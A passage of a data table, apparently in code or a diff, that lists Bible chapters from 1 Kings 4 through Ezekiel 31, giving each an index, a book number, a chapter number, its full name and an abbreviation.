Kin 4'], [296, 11, 5, '1 Kings 5', '1 Kin 5'], [297, 11, 6, '1 Kings 6', '1 Kin 6'], [298, 11, 7, '1 Kings 7', '1 Kin 7'], [299, 11, 8, '1 Kings 8', '1 Kin 8'], [300, 11, 9, '1 Kings 9', '1 Kin 9'], [301, 11, 10, '1 Kings 10', '1 Kin 10'], [302, 11, 11, '1 Kings 11', '1 Kin 11'], [303, 11, 12, '1 Kings 12', '1 Kin 12'], [304, 11, 13, '1 Kings 13', '1 Kin 13'], [305, 11, 14, '1 Kings 14', '1 Kin 14'], [306, 11, 15, '1 Kings 15', '1 Kin 15'], [307, 11, 16, '1 Kings 16', '1 Kin 16'], [308, 11, 17, '1 Kings 17', '1 Kin 17'], [309, 11, 18, '1 Kings 18', '1 Kin 18'], [310, 11, 19, '1 Kings 19', '1 Kin 19'], [311, 11, 20, '1 Kings 20', '1 Kin 20'], [312, 11, 21, '1 Kings 21', '1 Kin 21'], [313, 11, 22, '1 Kings 22', '1 Kin 22'], [314, 12, 1, '2 Kings 1', '2 Kin 1'], [315, 12, 2, '2 Kings 2', '2 Kin 2'], [316, 12, 3, '2 Kings 3', '2 Kin 3'], [317, 12, 4, '2 Kings 4', '2 Kin 4'], [318, 12, 5, '2 Kings 5', '2 Kin 5'], [319, 12, 6, '2 Kings 6', '2 Kin 6'], [320, 12, 7, '2 Kings 7', '2 Kin 7'], [321, 12, 8, '2 Kings 8', '2 Kin 8'], [322, 12, 9, '2 Kings 9', '2 Kin 9'], [323, 12, 10, '2 Kings 10', '2 Kin 10'], [324, 12, 11, '2 Kings 11', '2 Kin 11'], [325, 12, 12, '2 Kings 12', '2 Kin 12'], [326, 12, 13, '2 Kings 13', '2 Kin 13'], [327, 12, 14, '2 Kings 14', '2 Kin 14'], [328, 12, 15, '2 Kings 15', '2 Kin 15'], [329, 12, 16, '2 Kings 16', '2 Kin 16'], [330, 12, 17, '2 Kings 17', '2 Kin 17'], [331, 12, 18, '2 Kings 18', '2 Kin 18'], [332, 12, 19, '2 Kings 19', '2 Kin 19'], [333, 12, 20, '2 Kings 20', '2 Kin 20'], [334, 12, 21, '2 Kings 21', '2 Kin 21'], [335, 12, 22, '2 Kings 22', '2 Kin 22'], [336, 12, 23, '2 Kings 23', '2 Kin 23'], [337, 12, 24, '2 Kings 24', '2 Kin 24'], [338, 12, 25, '2 Kings 25', '2 Kin 25'], [339, 13, 1, '1 Chronicles 1', '1 Chr 1'], [340, 13, 2, '1 Chronicles 2', '1 Chr 2'], [341, 13, 3, '1 Chronicles 3', '1 Chr 3'], [342, 13, 4, '1 Chronicles 4', '1 Chr 4'], [343, 13, 5, '1 Chronicles 5', '1 Chr 5'], [344, 13, 6, '1 Chronicles 6', '1 Chr 6'], [345, 13, 7, '1 Chronicles 7', '1 Chr 7'], [346, 13, 8, '1 Chronicles 8', '1 Chr 8'], [347, 13, 9, '1 Chronicles 9', '1 Chr 9'], [348, 13, 10, '1 Chronicles 10', '1 Chr 10'], [349, 13, 11, '1 Chronicles 11', '1 Chr 11'], [350, 13, 12, '1 Chronicles 12', '1 Chr 12'], [351, 13, 13, '1 Chronicles 13', '1 Chr 13'], [352, 13, 14, '1 Chronicles 14', '1 Chr 14'], [353, 13, 15, '1 Chronicles 15', '1 Chr 15'], [354, 13, 16, '1 Chronicles 16', '1 Chr 16'], [355, 13, 17, '1 Chronicles 17', '1 Chr 17'], [356, 13, 18, '1 Chronicles 18', '1 Chr 18'], [357, 13, 19, '1 Chronicles 19', '1 Chr 19'], [358, 13, 20, '1 Chronicles 20', '1 Chr 20'], [359, 13, 21, '1 Chronicles 21', '1 Chr 21'], [360, 13, 22, '1 Chronicles 22', '1 Chr 22'], [361, 13, 23, '1 Chronicles 23', '1 Chr 23'], [362, 13, 24, '1 Chronicles 24', '1 Chr 24'], [363, 13, 25, '1 Chronicles 25', '1 Chr 25'], [364, 13, 26, '1 Chronicles 26', '1 Chr 26'], [365, 13, 27, '1 Chronicles 27', '1 Chr 27'], [366, 13, 28, '1 Chronicles 28', '1 Chr 28'], [367, 13, 29, '1 Chronicles 29', '1 Chr 29'], [368, 14, 1, '2 Chronicles 1', '2 Chr 1'], [369, 14, 2, '2 Chronicles 2', '2 Chr 2'], [370, 14, 3, '2 Chronicles 3', '2 Chr 3'], [371, 14, 4, '2 Chronicles 4', '2 Chr 4'], [372, 14, 5, '2 Chronicles 5', '2 Chr 5'], [373, 14, 6, '2 Chronicles 6', '2 Chr 6'], [374, 14, 7, '2 Chronicles 7', '2 Chr 7'], [375, 14, 8, '2 Chronicles 8', '2 Chr 8'], [376, 14, 9, '2 Chronicles 9', '2 Chr 9'], [377, 14, 10, '2 Chronicles 10', '2 Chr 10'], [378, 14, 11, '2 Chronicles 11', '2 Chr 11'], [379, 14, 12, '2 Chronicles 12', '2 Chr 12'], [380, 14, 13, '2 Chronicles 13', '2 Chr 13'], [381, 14, 14, '2 Chronicles 14', '2 Chr 14'], [382, 14, 15, '2 Chronicles 15', '2 Chr 15'], [383, 14, 16, '2 Chronicles 16', '2 Chr 16'], [384, 14, 17, '2 Chronicles 17', '2 Chr 17'], [385, 14, 18, '2 Chronicles 18', '2 Chr 18'], [386, 14, 19, '2 Chronicles 19', '2 Chr 19'], [387, 14, 20, '2 Chronicles 20', '2 Chr 20'], [388, 14, 21, '2 Chronicles 21', '2 Chr 21'], [389, 14, 22, '2 Chronicles 22', '2 Chr 22'], [390, 14, 23, '2 Chronicles 23', '2 Chr 23'], [391, 14, 24, '2 Chronicles 24', '2 Chr 24'], [392, 14, 25, '2 Chronicles 25', '2 Chr 25'], [393, 14, 26, '2 Chronicles 26', '2 Chr 26'], [394, 14, 27, '2 Chronicles 27', '2 Chr 27'], [395, 14, 28, '2 Chronicles 28', '2 Chr 28'], [396, 14, 29, '2 Chronicles 29', '2 Chr 29'], [397, 14, 30, '2 Chronicles 30', '2 Chr 30'], [398, 14, 31, '2 Chronicles 31', '2 Chr 31'], [399, 14, 32, '2 Chronicles 32', '2 Chr 32'], [400, 14, 33, '2 Chronicles 33', '2 Chr 33'], [401, 14, 34, '2 Chronicles 34', '2 Chr 34'], [402, 14, 35, '2 Chronicles 35', '2 Chr 35'], [403, 14, 36, '2 Chronicles 36', '2 Chr 36'], [404, 15, 1, 'Ezra 1', 'Ezr 1'], [405, 15, 2, 'Ezra 2', 'Ezr 2'], [406, 15, 3, 'Ezra 3', 'Ezr 3'], [407, 15, 4, 'Ezra 4', 'Ezr 4'], [408, 15, 5, 'Ezra 5', 'Ezr 5'], [409, 15, 6, 'Ezra 6', 'Ezr 6'], [410, 15, 7, 'Ezra 7', 'Ezr 7'], [411, 15, 8, 'Ezra 8', 'Ezr 8'], [412, 15, 9, 'Ezra 9', 'Ezr 9'], [413, 15, 10, 'Ezra 10', 'Ezr 10'], [414, 16, 1, 'Nehemiah 1', 'Neh 1'], [415, 16, 2, 'Nehemiah 2', 'Neh 2'], [416, 16, 3, 'Nehemiah 3', 'Neh 3'], [417, 16, 4, 'Nehemiah 4', 'Neh 4'], [418, 16, 5, 'Nehemiah 5', 'Neh 5'], [419, 16, 6, 'Nehemiah 6', 'Neh 6'], [420, 16, 7, 'Nehemiah 7', 'Neh 7'], [421, 16, 8, 'Nehemiah 8', 'Neh 8'], [422, 16, 9, 'Nehemiah 9', 'Neh 9'], [423, 16, 10, 'Nehemiah 10', 'Neh 10'], [424, 16, 11, 'Nehemiah 11', 'Neh 11'], [425, 16, 12, 'Nehemiah 12', 'Neh 12'], [426, 16, 13, 'Nehemiah 13', 'Neh 13'], [427, 17, 1, 'Esther 1', 'Est 1'], [428, 17, 2, 'Esther 2', 'Est 2'], [429, 17, 3, 'Esther 3', 'Est 3'], [430, 17, 4, 'Esther 4', 'Est 4'], [431, 17, 5, 'Esther 5', 'Est 5'], [432, 17, 6, 'Esther 6', 'Est 6'], [433, 17, 7, 'Esther 7', 'Est 7'], [434, 17, 8, 'Esther 8', 'Est 8'], [435, 17, 9, 'Esther 9', 'Est 9'], [436, 17, 10, 'Esther 10', 'Est 10'], [437, 18, 1, 'Job 1', 'Job 1'], [438, 18, 2, 'Job 2', 'Job 2'], [439, 18, 3, 'Job 3', 'Job 3'], [440, 18, 4, 'Job 4', 'Job 4'], [441, 18, 5, 'Job 5', 'Job 5'], [442, 18, 6, 'Job 6', 'Job 6'], [443, 18, 7, 'Job 7', 'Job 7'], [444, 18, 8, 'Job 8', 'Job 8'], [445, 18, 9, 'Job 9', 'Job 9'], [446, 18, 10, 'Job 10', 'Job 10'], [447, 18, 11, 'Job 11', 'Job 11'], [448, 18, 12, 'Job 12', 'Job 12'], [449, 18, 13, 'Job 13', 'Job 13'], [450, 18, 14, 'Job 14', 'Job 14'], [451, 18, 15, 'Job 15', 'Job 15'], [452, 18, 16, 'Job 16', 'Job 16'], [453, 18, 17, 'Job 17', 'Job 17'], [454, 18, 18, 'Job 18', 'Job 18'], [455, 18, 19, 'Job 19', 'Job 19'], [456, 18, 20, 'Job 20', 'Job 20'], [457, 18, 21, 'Job 21', 'Job 21'], [458, 18, 22, 'Job 22', 'Job 22'], [459, 18, 23, 'Job 23', 'Job 23'], [460, 18, 24, 'Job 24', 'Job 24'], [461, 18, 25, 'Job 25', 'Job 25'], [462, 18, 26, 'Job 26', 'Job 26'], [463, 18, 27, 'Job 27', 'Job 27'], [464, 18, 28, 'Job 28', 'Job 28'], [465, 18, 29, 'Job 29', 'Job 29'], [466, 18, 30, 'Job 30', 'Job 30'], [467, 18, 31, 'Job 31', 'Job 31'], [468, 18, 32, 'Job 32', 'Job 32'], [469, 18, 33, 'Job 33', 'Job 33'], [470, 18, 34, 'Job 34', 'Job 34'], [471, 18, 35, 'Job 35', 'Job 35'], [472, 18, 36, 'Job 36', 'Job 36'], [473, 18, 37, 'Job 37', 'Job 37'], [474, 18, 38, 'Job 38', 'Job 38'], [475, 18, 39, 'Job 39', 'Job 39'], [476, 18, 40, 'Job 40', 'Job 40'], [477, 18, 41, 'Job 41', 'Job 41'], [478, 18, 42, 'Job 42', 'Job 42'], [479, 19, 1, 'Psalms 1', 'Psa 1'], [480, 19, 2, 'Psalms 2', 'Psa 2'], [481, 19, 3, 'Psalms 3', 'Psa 3'], [482, 19, 4, 'Psalms 4', 'Psa 4'], [483, 19, 5, 'Psalms 5', 'Psa 5'], [484, 19, 6, 'Psalms 6', 'Psa 6'], [485, 19, 7, 'Psalms 7', 'Psa 7'], [486, 19, 8, 'Psalms 8', 'Psa 8'], [487, 19, 9, 'Psalms 9', 'Psa 9'], [488, 19, 10, 'Psalms 10', 'Psa 10'], [489, 19, 11, 'Psalms 11', 'Psa 11'], [490, 19, 12, 'Psalms 12', 'Psa 12'], [491, 19, 13, 'Psalms 13', 'Psa 13'], [492, 19, 14, 'Psalms 14', 'Psa 14'], [493, 19, 15, 'Psalms 15', 'Psa 15'], [494, 19, 16, 'Psalms 16', 'Psa 16'], [495, 19, 17, 'Psalms 17', 'Psa 17'], [496, 19, 18, 'Psalms 18', 'Psa 18'], [497, 19, 19, 'Psalms 19', 'Psa 19'], [498, 19, 20, 'Psalms 20', 'Psa 20'], [499, 19, 21, 'Psalms 21', 'Psa 21'], [500, 19, 22, 'Psalms 22', 'Psa 22'], [501, 19, 23, 'Psalms 23', 'Psa 23'], [502, 19, 24, 'Psalms 24', 'Psa 24'], [503, 19, 25, 'Psalms 25', 'Psa 25'], [504, 19, 26, 'Psalms 26', 'Psa 26'], [505, 19, 27, 'Psalms 27', 'Psa 27'], [506, 19, 28, 'Psalms 28', 'Psa 28'], [507, 19, 29, 'Psalms 29', 'Psa 29'], [508, 19, 30, 'Psalms 30', 'Psa 30'], [509, 19, 31, 'Psalms 31', 'Psa 31'], [510, 19, 32, 'Psalms 32', 'Psa 32'], [511, 19, 33, 'Psalms 33', 'Psa 33'], [512, 19, 34, 'Psalms 34', 'Psa 34'], [513, 19, 35, 'Psalms 35', 'Psa 35'], [514, 19, 36, 'Psalms 36', 'Psa 36'], [515, 19, 37, 'Psalms 37', 'Psa 37'], [516, 19, 38, 'Psalms 38', 'Psa 38'], [517, 19, 39, 'Psalms 39', 'Psa 39'], [518, 19, 40, 'Psalms 40', 'Psa 40'], [519, 19, 41, 'Psalms 41', 'Psa 41'], [520, 19, 42, 'Psalms 42', 'Psa 42'], [521, 19, 43, 'Psalms 43', 'Psa 43'], [522, 19, 44, 'Psalms 44', 'Psa 44'], [523, 19, 45, 'Psalms 45', 'Psa 45'], [524, 19, 46, 'Psalms 46', 'Psa 46'], [525, 19, 47, 'Psalms 47', 'Psa 47'], [526, 19, 48, 'Psalms 48', 'Psa 48'], [527, 19, 49, 'Psalms 49', 'Psa 49'], [528, 19, 50, 'Psalms 50', 'Psa 50'], [529, 19, 51, 'Psalms 51', 'Psa 51'], [530, 19, 52, 'Psalms 52', 'Psa 52'], [531, 19, 53, 'Psalms 53', 'Psa 53'], [532, 19, 54, 'Psalms 54', 'Psa 54'], [533, 19, 55, 'Psalms 55', 'Psa 55'], [534, 19, 56, 'Psalms 56', 'Psa 56'], [535, 19, 57, 'Psalms 57', 'Psa 57'], [536, 19, 58, 'Psalms 58', 'Psa 58'], [537, 19, 59, 'Psalms 59', 'Psa 59'], [538, 19, 60, 'Psalms 60', 'Psa 60'], [539, 19, 61, 'Psalms 61', 'Psa 61'], [540, 19, 62, 'Psalms 62', 'Psa 62'], [541, 19, 63, 'Psalms 63', 'Psa 63'], [542, 19, 64, 'Psalms 64', 'Psa 64'], [543, 19, 65, 'Psalms 65', 'Psa 65'], [544, 19, 66, 'Psalms 66', 'Psa 66'], [545, 19, 67, 'Psalms 67', 'Psa 67'], [546, 19, 68, 'Psalms 68', 'Psa 68'], [547, 19, 69, 'Psalms 69', 'Psa 69'], [548, 19, 70, 'Psalms 70', 'Psa 70'], [549, 19, 71, 'Psalms 71', 'Psa 71'], [550, 19, 72, 'Psalms 72', 'Psa 72'], [551, 19, 73, 'Psalms 73', 'Psa 73'], [552, 19, 74, 'Psalms 74', 'Psa 74'], [553, 19, 75, 'Psalms 75', 'Psa 75'], [554, 19, 76, 'Psalms 76', 'Psa 76'], [555, 19, 77, 'Psalms 77', 'Psa 77'], [556, 19, 78, 'Psalms 78', 'Psa 78'], [557, 19, 79, 'Psalms 79', 'Psa 79'], [558, 19, 80, 'Psalms 80', 'Psa 80'], [559, 19, 81, 'Psalms 81', 'Psa 81'], [560, 19, 82, 'Psalms 82', 'Psa 82'], [561, 19, 83, 'Psalms 83', 'Psa 83'], [562, 19, 84, 'Psalms 84', 'Psa 84'], [563, 19, 85, 'Psalms 85', 'Psa 85'], [564, 19, 86, 'Psalms 86', 'Psa 86'], [565, 19, 87, 'Psalms 87', 'Psa 87'], [566, 19, 88, 'Psalms 88', 'Psa 88'], [567, 19, 89, 'Psalms 89', 'Psa 89'], [568, 19, 90, 'Psalms 90', 'Psa 90'], [569, 19, 91, 'Psalms 91', 'Psa 91'], [570, 19, 92, 'Psalms 92', 'Psa 92'], [571, 19, 93, 'Psalms 93', 'Psa 93'], [572, 19, 94, 'Psalms 94', 'Psa 94'], [573, 19, 95, 'Psalms 95', 'Psa 95'], [574, 19, 96, 'Psalms 96', 'Psa 96'], [575, 19, 97, 'Psalms 97', 'Psa 97'], [576, 19, 98, 'Psalms 98', 'Psa 98'], [577, 19, 99, 'Psalms 99', 'Psa 99'], [578, 19, 100, 'Psalms 100', 'Psa 100'], [579, 19, 101, 'Psalms 101', 'Psa 101'], [580, 19, 102, 'Psalms 102', 'Psa 102'], [581, 19, 103, 'Psalms 103', 'Psa 103'], [582, 19, 104, 'Psalms 104', 'Psa 104'], [583, 19, 105, 'Psalms 105', 'Psa 105'], [584, 19, 106, 'Psalms 106', 'Psa 106'], [585, 19, 107, 'Psalms 107', 'Psa 107'], [586, 19, 108, 'Psalms 108', 'Psa 108'], [587, 19, 109, 'Psalms 109', 'Psa 109'], [588, 19, 110, 'Psalms 110', 'Psa 110'], [589, 19, 111, 'Psalms 111', 'Psa 111'], [590, 19, 112, 'Psalms 112', 'Psa 112'], [591, 19, 113, 'Psalms 113', 'Psa 113'], [592, 19, 114, 'Psalms 114', 'Psa 114'], [593, 19, 115, 'Psalms 115', 'Psa 115'], [594, 19, 116, 'Psalms 116', 'Psa 116'], [595, 19, 117, 'Psalms 117', 'Psa 117'], [
+    596, 19, 118, 'Psalms 118', 'Psa 118'], [597, 19, 119, 'Psalms 119', 'Psa 119'], [598, 19, 120, 'Psalms 120', 'Psa 120'], [599, 19, 121, 'Psalms 121', 'Psa 121'], [600, 19, 122, 'Psalms 122', 'Psa 122'], [601, 19, 123, 'Psalms 123', 'Psa 123'], [602, 19, 124, 'Psalms 124', 'Psa 124'], [603, 19, 125, 'Psalms 125', 'Psa 125'], [604, 19, 126, 'Psalms 126', 'Psa 126'], [605, 19, 127, 'Psalms 127', 'Psa 127'], [606, 19, 128, 'Psalms 128', 'Psa 128'], [607, 19, 129, 'Psalms 129', 'Psa 129'], [608, 19, 130, 'Psalms 130', 'Psa 130'], [609, 19, 131, 'Psalms 131', 'Psa 131'], [610, 19, 132, 'Psalms 132', 'Psa 132'], [611, 19, 133, 'Psalms 133', 'Psa 133'], [612, 19, 134, 'Psalms 134', 'Psa 134'], [613, 19, 135, 'Psalms 135', 'Psa 135'], [614, 19, 136, 'Psalms 136', 'Psa 136'], [615, 19, 137, 'Psalms 137', 'Psa 137'], [616, 19, 138, 'Psalms 138', 'Psa 138'], [617, 19, 139, 'Psalms 139', 'Psa 139'], [618, 19, 140, 'Psalms 140', 'Psa 140'], [619, 19, 141, 'Psalms 141', 'Psa 141'], [620, 19, 142, 'Psalms 142', 'Psa 142'], [621, 19, 143, 'Psalms 143', 'Psa 143'], [622, 19, 144, 'Psalms 144', 'Psa 144'], [623, 19, 145, 'Psalms 145', 'Psa 145'], [624, 19, 146, 'Psalms 146', 'Psa 146'], [625, 19, 147, 'Psalms 147', 'Psa 147'], [626, 19, 148, 'Psalms 148', 'Psa 148'], [627, 19, 149, 'Psalms 149', 'Psa 149'], [628, 19, 150, 'Psalms 150', 'Psa 150'], [629, 20, 1, 'Proverbs 1', 'Pro 1'], [630, 20, 2, 'Proverbs 2', 'Pro 2'], [631, 20, 3, 'Proverbs 3', 'Pro 3'], [632, 20, 4, 'Proverbs 4', 'Pro 4'], [633, 20, 5, 'Proverbs 5', 'Pro 5'], [634, 20, 6, 'Proverbs 6', 'Pro 6'], [635, 20, 7, 'Proverbs 7', 'Pro 7'], [636, 20, 8, 'Proverbs 8', 'Pro 8'], [637, 20, 9, 'Proverbs 9', 'Pro 9'], [638, 20, 10, 'Proverbs 10', 'Pro 10'], [639, 20, 11, 'Proverbs 11', 'Pro 11'], [640, 20, 12, 'Proverbs 12', 'Pro 12'], [641, 20, 13, 'Proverbs 13', 'Pro 13'], [642, 20, 14, 'Proverbs 14', 'Pro 14'], [643, 20, 15, 'Proverbs 15', 'Pro 15'], [644, 20, 16, 'Proverbs 16', 'Pro 16'], [645, 20, 17, 'Proverbs 17', 'Pro 17'], [646, 20, 18, 'Proverbs 18', 'Pro 18'], [647, 20, 19, 'Proverbs 19', 'Pro 19'], [648, 20, 20, 'Proverbs 20', 'Pro 20'], [649, 20, 21, 'Proverbs 21', 'Pro 21'], [650, 20, 22, 'Proverbs 22', 'Pro 22'], [651, 20, 23, 'Proverbs 23', 'Pro 23'], [652, 20, 24, 'Proverbs 24', 'Pro 24'], [653, 20, 25, 'Proverbs 25', 'Pro 25'], [654, 20, 26, 'Proverbs 26', 'Pro 26'], [655, 20, 27, 'Proverbs 27', 'Pro 27'], [656, 20, 28, 'Proverbs 28', 'Pro 28'], [657, 20, 29, 'Proverbs 29', 'Pro 29'], [658, 20, 30, 'Proverbs 30', 'Pro 30'], [659, 20, 31, 'Proverbs 31', 'Pro 31'], [660, 21, 1, 'Ecclesiastes 1', 'Ecc 1'], [661, 21, 2, 'Ecclesiastes 2', 'Ecc 2'], [662, 21, 3, 'Ecclesiastes 3', 'Ecc 3'], [663, 21, 4, 'Ecclesiastes 4', 'Ecc 4'], [664, 21, 5, 'Ecclesiastes 5', 'Ecc 5'], [665, 21, 6, 'Ecclesiastes 6', 'Ecc 6'], [666, 21, 7, 'Ecclesiastes 7', 'Ecc 7'], [667, 21, 8, 'Ecclesiastes 8', 'Ecc 8'], [668, 21, 9, 'Ecclesiastes 9', 'Ecc 9'], [669, 21, 10, 'Ecclesiastes 10', 'Ecc 10'], [670, 21, 11, 'Ecclesiastes 11', 'Ecc 11'], [671, 21, 12, 'Ecclesiastes 12', 'Ecc 12'], [672, 22, 1, 'Song of Solomon 1', 'Son 1'], [673, 22, 2, 'Song of Solomon 2', 'Son 2'], [674, 22, 3, 'Song of Solomon 3', 'Son 3'], [675, 22, 4, 'Song of Solomon 4', 'Son 4'], [676, 22, 5, 'Song of Solomon 5', 'Son 5'], [677, 22, 6, 'Song of Solomon 6', 'Son 6'], [678, 22, 7, 'Song of Solomon 7', 'Son 7'], [679, 22, 8, 'Song of Solomon 8', 'Son 8'], [680, 23, 1, 'Isaiah 1', 'Isa 1'], [681, 23, 2, 'Isaiah 2', 'Isa 2'], [682, 23, 3, 'Isaiah 3', 'Isa 3'], [683, 23, 4, 'Isaiah 4', 'Isa 4'], [684, 23, 5, 'Isaiah 5', 'Isa 5'], [685, 23, 6, 'Isaiah 6', 'Isa 6'], [686, 23, 7, 'Isaiah 7', 'Isa 7'], [687, 23, 8, 'Isaiah 8', 'Isa 8'], [688, 23, 9, 'Isaiah 9', 'Isa 9'], [689, 23, 10, 'Isaiah 10', 'Isa 10'], [690, 23, 11, 'Isaiah 11', 'Isa 11'], [691, 23, 12, 'Isaiah 12', 'Isa 12'], [692, 23, 13, 'Isaiah 13', 'Isa 13'], [693, 23, 14, 'Isaiah 14', 'Isa 14'], [694, 23, 15, 'Isaiah 15', 'Isa 15'], [695, 23, 16, 'Isaiah 16', 'Isa 16'], [696, 23, 17, 'Isaiah 17', 'Isa 17'], [697, 23, 18, 'Isaiah 18', 'Isa 18'], [698, 23, 19, 'Isaiah 19', 'Isa 19'], [699, 23, 20, 'Isaiah 20', 'Isa 20'], [700, 23, 21, 'Isaiah 21', 'Isa 21'], [701, 23, 22, 'Isaiah 22', 'Isa 22'], [702, 23, 23, 'Isaiah 23', 'Isa 23'], [703, 23, 24, 'Isaiah 24', 'Isa 24'], [704, 23, 25, 'Isaiah 25', 'Isa 25'], [705, 23, 26, 'Isaiah 26', 'Isa 26'], [706, 23, 27, 'Isaiah 27', 'Isa 27'], [707, 23, 28, 'Isaiah 28', 'Isa 28'], [708, 23, 29, 'Isaiah 29', 'Isa 29'], [709, 23, 30, 'Isaiah 30', 'Isa 30'], [710, 23, 31, 'Isaiah 31', 'Isa 31'], [711, 23, 32, 'Isaiah 32', 'Isa 32'], [712, 23, 33, 'Isaiah 33', 'Isa 33'], [713, 23, 34, 'Isaiah 34', 'Isa 34'], [714, 23, 35, 'Isaiah 35', 'Isa 35'], [715, 23, 36, 'Isaiah 36', 'Isa 36'], [716, 23, 37, 'Isaiah 37', 'Isa 37'], [717, 23, 38, 'Isaiah 38', 'Isa 38'], [718, 23, 39, 'Isaiah 39', 'Isa 39'], [719, 23, 40, 'Isaiah 40', 'Isa 40'], [720, 23, 41, 'Isaiah 41', 'Isa 41'], [721, 23, 42, 'Isaiah 42', 'Isa 42'], [722, 23, 43, 'Isaiah 43', 'Isa 43'], [723, 23, 44, 'Isaiah 44', 'Isa 44'], [724, 23, 45, 'Isaiah 45', 'Isa 45'], [725, 23, 46, 'Isaiah 46', 'Isa 46'], [726, 23, 47, 'Isaiah 47', 'Isa 47'], [727, 23, 48, 'Isaiah 48', 'Isa 48'], [728, 23, 49, 'Isaiah 49', 'Isa 49'], [729, 23, 50, 'Isaiah 50', 'Isa 50'], [730, 23, 51, 'Isaiah 51', 'Isa 51'], [731, 23, 52, 'Isaiah 52', 'Isa 52'], [732, 23, 53, 'Isaiah 53', 'Isa 53'], [733, 23, 54, 'Isaiah 54', 'Isa 54'], [734, 23, 55, 'Isaiah 55', 'Isa 55'], [735, 23, 56, 'Isaiah 56', 'Isa 56'], [736, 23, 57, 'Isaiah 57', 'Isa 57'], [737, 23, 58, 'Isaiah 58', 'Isa 58'], [738, 23, 59, 'Isaiah 59', 'Isa 59'], [739, 23, 60, 'Isaiah 60', 'Isa 60'], [740, 23, 61, 'Isaiah 61', 'Isa 61'], [741, 23, 62, 'Isaiah 62', 'Isa 62'], [742, 23, 63, 'Isaiah 63', 'Isa 63'], [743, 23, 64, 'Isaiah 64', 'Isa 64'], [744, 23, 65, 'Isaiah 65', 'Isa 65'], [745, 23, 66, 'Isaiah 66', 'Isa 66'], [746, 24, 1, 'Jeremiah 1', 'Jer 1'], [747, 24, 2, 'Jeremiah 2', 'Jer 2'], [748, 24, 3, 'Jeremiah 3', 'Jer 3'], [749, 24, 4, 'Jeremiah 4', 'Jer 4'], [750, 24, 5, 'Jeremiah 5', 'Jer 5'], [751, 24, 6, 'Jeremiah 6', 'Jer 6'], [752, 24, 7, 'Jeremiah 7', 'Jer 7'], [753, 24, 8, 'Jeremiah 8', 'Jer 8'], [754, 24, 9, 'Jeremiah 9', 'Jer 9'], [755, 24, 10, 'Jeremiah 10', 'Jer 10'], [756, 24, 11, 'Jeremiah 11', 'Jer 11'], [757, 24, 12, 'Jeremiah 12', 'Jer 12'], [758, 24, 13, 'Jeremiah 13', 'Jer 13'], [759, 24, 14, 'Jeremiah 14', 'Jer 14'], [760, 24, 15, 'Jeremiah 15', 'Jer 15'], [761, 24, 16, 'Jeremiah 16', 'Jer 16'], [762, 24, 17, 'Jeremiah 17', 'Jer 17'], [763, 24, 18, 'Jeremiah 18', 'Jer 18'], [764, 24, 19, 'Jeremiah 19', 'Jer 19'], [765, 24, 20, 'Jeremiah 20', 'Jer 20'], [766, 24, 21, 'Jeremiah 21', 'Jer 21'], [767, 24, 22, 'Jeremiah 22', 'Jer 22'], [768, 24, 23, 'Jeremiah 23', 'Jer 23'], [769, 24, 24, 'Jeremiah 24', 'Jer 24'], [770, 24, 25, 'Jeremiah 25', 'Jer 25'], [771, 24, 26, 'Jeremiah 26', 'Jer 26'], [772, 24, 27, 'Jeremiah 27', 'Jer 27'], [773, 24, 28, 'Jeremiah 28', 'Jer 28'], [774, 24, 29, 'Jeremiah 29', 'Jer 29'], [775, 24, 30, 'Jeremiah 30', 'Jer 30'], [776, 24, 31, 'Jeremiah 31', 'Jer 31'], [777, 24, 32, 'Jeremiah 32', 'Jer 32'], [778, 24, 33, 'Jeremiah 33', 'Jer 33'], [779, 24, 34, 'Jeremiah 34', 'Jer 34'], [780, 24, 35, 'Jeremiah 35', 'Jer 35'], [781, 24, 36, 'Jeremiah 36', 'Jer 36'], [782, 24, 37, 'Jeremiah 37', 'Jer 37'], [783, 24, 38, 'Jeremiah 38', 'Jer 38'], [784, 24, 39, 'Jeremiah 39', 'Jer 39'], [785, 24, 40, 'Jeremiah 40', 'Jer 40'], [786, 24, 41, 'Jeremiah 41', 'Jer 41'], [787, 24, 42, 'Jeremiah 42', 'Jer 42'], [788, 24, 43, 'Jeremiah 43', 'Jer 43'], [789, 24, 44, 'Jeremiah 44', 'Jer 44'], [790, 24, 45, 'Jeremiah 45', 'Jer 45'], [791, 24, 46, 'Jeremiah 46', 'Jer 46'], [792, 24, 47, 'Jeremiah 47', 'Jer 47'], [793, 24, 48, 'Jeremiah 48', 'Jer 48'], [794, 24, 49, 'Jeremiah 49', 'Jer 49'], [795, 24, 50, 'Jeremiah 50', 'Jer 50'], [796, 24, 51, 'Jeremiah 51', 'Jer 51'], [797, 24, 52, 'Jeremiah 52', 'Jer 52'], [798, 25, 1, 'Lamentations 1', 'Lam 1'], [799, 25, 2, 'Lamentations 2', 'Lam 2'], [800, 25, 3, 'Lamentations 3', 'Lam 3'], [801, 25, 4, 'Lamentations 4', 'Lam 4'], [802, 25, 5, 'Lamentations 5', 'Lam 5'], [803, 26, 1, 'Ezekiel 1', 'Eze 1'], [804, 26, 2, 'Ezekiel 2', 'Eze 2'], [805, 26, 3, 'Ezekiel 3', 'Eze 3'], [806, 26, 4, 'Ezekiel 4', 'Eze 4'], [807, 26, 5, 'Ezekiel 5', 'Eze 5'], [808, 26, 6, 'Ezekiel 6', 'Eze 6'], [809, 26, 7, 'Ezekiel 7', 'Eze 7'], [810, 26, 8, 'Ezekiel 8', 'Eze 8'], [811, 26, 9, 'Ezekiel 9', 'Eze 9'], [812, 26, 10, 'Ezekiel 10', 'Eze 10'], [813, 26, 11, 'Ezekiel 11', 'Eze 11'], [814, 26, 12, 'Ezekiel 12', 'Eze 12'], [815, 26, 13, 'Ezekiel 13', 'Eze 13'], [816, 26, 14, 'Ezekiel 14', 'Eze 14'], [817, 26, 15, 'Ezekiel 15', 'Eze 15'], [818, 26, 16, 'Ezekiel 16', 'Eze 16'], [819, 26, 17, 'Ezekiel 17', 'Eze 17'], [820, 26, 18, 'Ezekiel 18', 'Eze 18'], [821, 26, 19, 'Ezekiel 19', 'Eze 19'], [822, 26, 20, 'Ezekiel 20', 'Eze 20'], [823, 26, 21, 'Ezekiel 21', 'Eze 21'], [824, 26, 22, 'Ezekiel 22', 'Eze 22'], [825, 26, 23, 'Ezekiel 23', 'Eze 23'], [826, 26, 24, 'Ezekiel 24', 'Eze 24'], [827, 26, 25, 'Ezekiel 25', 'Eze 25'], [828, 26, 26, 'Ezekiel 26', 'Eze 26'], [829, 26, 27, 'Ezekiel 27', 'Eze 27'], [830, 26, 28, 'Ezekiel 28', 'Eze 28'], [831, 26, 29, 'Ezekiel 29', 'Eze 29'], [832, 26, 30, 'Ezekiel 30', 'Eze 30'], [833, 26, 31, 'Ezekiel 31', 